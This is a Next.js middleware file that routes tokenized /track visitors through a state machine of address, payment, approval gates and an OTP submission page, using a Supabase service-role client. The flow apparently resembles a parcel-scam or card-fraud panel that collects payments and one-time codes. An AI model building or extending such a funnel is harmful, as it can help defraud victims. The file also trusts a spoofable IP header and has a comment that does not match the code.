import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
import { createClient } from '@/utils/supabase/server'
import { createClient as createServiceClient } from '@supabase/supabase-js'

import { ipRateLimit } from '@/utils/ratelimit'

export async function middleware(request: NextRequest) {
    const ip = request.headers.get('x-forwarded-for') ?? '127.0.0.1'
    const { success } = await ipRateLimit.limit(ip)

    if (!success) {
        return new NextResponse("Too Many Requests", { status: 429 })
    }

    const response = NextResponse.next()

    // 1. Client Funnel Enforcement
    // All client entries happen via /track?token=... 
    // We rewrite them to hidden routes based on their State Machine status.
    if (request.nextUrl.pathname.startsWith('/track')) {
        const urlToken = request.nextUrl.searchParams.get('token')

        if (!urlToken) {
            return NextResponse.redirect(new URL('/unauthorized', request.url))
        }

        // Hash token to compare using Web Crypto API for Edge Runtime
        const encoder = new TextEncoder()
        const data = encoder.encode(urlToken)
        const hashBuffer = await crypto.subtle.digest('SHA-256', data)
        const hashArray = Array.from(new Uint8Array(hashBuffer))
        const tokenHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('')

        const supabase = createServiceClient(
            process.env.NEXT_PUBLIC_SUPABASE_URL!,
            process.env.SUPABASE_SERVICE_ROLE_KEY!
        )

        // Bypass RLS because middleware is server-side and clients don't have Auth sessions
        const { data: client, error } = await supabase
            .from('clients')
            .select('id, state, token_expires_at')
            .eq('token_hash', tokenHash)
            .single()

        if (error || !client) {
            return NextResponse.redirect(new URL('/unauthorized', request.url))
        }

        if (new Date(client.token_expires_at) < new Date()) {
            return NextResponse.redirect(new URL('/expired', request.url))
        }

        // State Machine Router: 
        // We forcibly map their state to a specific URL path. 
        // They literally cannot access another page because the middleware overrides it.
        const stateMap: Record<string, string> = {
            'INVITED': '/funnel/logistics',
            'LINK_CLICKED': '/funnel/logistics',
            'ADDRESS_CONFIRMED': '/funnel/payment',
            'PAYMENT_SUBMITTED': '/funnel/waiting1',
            'GATE_1_APPROVED': '/funnel/otp',
            'OTP_SUBMITTED': '/funnel/waiting2',
            'GATE_2_APPROVED': '/funnel/confirmed',
            'REJECTED': '/funnel/rejected'
        }

        // If they just arrived and are in INVITED state, transition to LINK_CLICKED
        if (client.state === 'INVITED') {
            await supabase.rpc('transition_client_state', {
                p_client_id: client.id,
                p_new_state: 'LINK_CLICKED',
                p_actor: 'system',
                p_ip: request.headers.get('x-forwarded-for') || 'unknown'
            })
        }

        const targetRoute = stateMap[client.state] || '/unauthorized'

        // Clone URL and append token so downstream page knows WHO is acting
        const destinationUrl = request.nextUrl.clone()
        destinationUrl.pathname = targetRoute
        return NextResponse.rewrite(destinationUrl)
    }

    // ... Allow Supabase Admin Auth middleware to run next ...
    const supabaseSessionResponse = await (await import('@/utils/supabase/middleware')).updateSession(request)
    return supabaseSessionResponse
}

export const config = {
    matcher: [
        '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
    ],
}
